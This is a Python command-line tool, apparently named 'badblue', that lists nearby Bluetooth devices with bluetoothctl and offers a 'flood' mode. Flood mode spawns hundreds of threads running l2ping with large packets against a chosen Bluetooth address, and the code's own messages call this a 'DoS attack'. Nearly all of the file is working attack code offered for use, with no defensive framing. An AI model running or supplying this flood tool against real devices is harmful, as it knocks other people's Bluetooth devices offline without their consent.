import asyncio
import glob
import time
import re
import threading
import subprocess
import argparse
import shutil
import sys

def _detect_serial_bluefruit_ports():
    return sorted(glob.glob("/dev/cu.usbserial*") + glob.glob("/dev/tty.usbserial*"))


def _print_adapter_hint():
    serial_ports = _detect_serial_bluefruit_ports()
    if serial_ports:
        print(
            "[!] Detected USB serial adapter(s): "
            + ", ".join(serial_ports)
            + "."
        )
        print(
            "[!] This is likely a CP210x/UART Bluefruit interface, not an OS HCI adapter."
        )
        print(
            "[!] `badblue` flood/list use host Bluetooth adapters (e.g., hci0 via BlueZ)."
        )


def list_bluetooth(wait_time):
    if shutil.which("bluetoothctl") is None:
        _print_adapter_hint()
        print("[!] bluetoothctl not found. Install BlueZ tools and retry.")
        return []

    # Start bluetoothctl as a subprocess
    process = subprocess.Popen(
        ['bluetoothctl'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Issue the 'scan on' command to start scanning
    process.stdin.write("scan on\n")
    process.stdin.flush()

    # Wait for a few seconds to gather scan results
    print(f'Waiting {wait_time}s for advertisements')
    time.sleep(wait_time)

    # Stop the scan
    process.stdin.write("scan off\n")
    process.stdin.flush()

    process.stdin.write("devices\n")
    process.stdin.flush()

    # Capture output
    output, _ = process.communicate()

    # Parse the output for device addresses and names
    devices = []
    for line in output.splitlines():
        match = re.search(r"Device ([0-9A-F:]+)\s+([\w\s:-]+)", line)
        if match:
            address, name = match.groups()
            devices.append(f'{address} {name}')

    return devices


async def main():
    args = parse_args()

    if args.command == 'list':
        # lists bluetooth devices
        for dev in list_bluetooth(args.wait_time):
            print(f'{dev}')

    elif args.command == 'flood':
        if sys.platform != "linux":
            print("[!] flood mode requires Linux + BlueZ (l2ping/hciX).")
            _print_adapter_hint()
            return

        if shutil.which("l2ping") is None:
            print("[!] l2ping not found. Install BlueZ tools and retry.")
            return

        for i in range(args.threads):
            print(f'[*] Thread {i}')
            threading.Thread(
                target=flood,
                args=(args.target, args.packet_size, args.interface),
                daemon=True,
            ).start()


def flood(target_addr, packet_size, interface):
    print(
        f"Performing DoS attack on {target_addr} with packet size {packet_size} via {interface}"
    )
    subprocess.run(['l2ping', '-i', interface, '-s', str(packet_size), target_addr])


def parse_args():
    parser = argparse.ArgumentParser(description="Script for Bluetooth scanning and DOS.")
    subparsers = parser.add_subparsers(dest='command')

    # list devices
    parser_list = subparsers.add_parser('list', help='List nearby devices')
    parser_list.add_argument('--wait-time', type=int, default=5, help='Number of seconds to wait when listening to advertisements (default: 5)')

    # flood devices
    parser_flood = subparsers.add_parser('flood', help='Flood target device')
    parser_flood.add_argument('target', type=str, help='Target Bluetooth address')
    parser_flood.add_argument(
        '--packet-size', type=int, default=600, help='Packet size (default: 600)'
    )
    parser_flood.add_argument(
        '--threads', type=int, default=300, help='Number of threads (default: 300)'
    )
    parser_flood.add_argument(
        '--interface',
        type=str,
        default='hci0',
        help='Bluetooth adapter interface (default: hci0)',
    )

    args = parser.parse_args()

    # Check if a subcommand was provided; if not, print help and exit
    if args.command is None:
        parser.print_help()
        exit(1)

    return args


if __name__ == '__main__':
    asyncio.run(main())

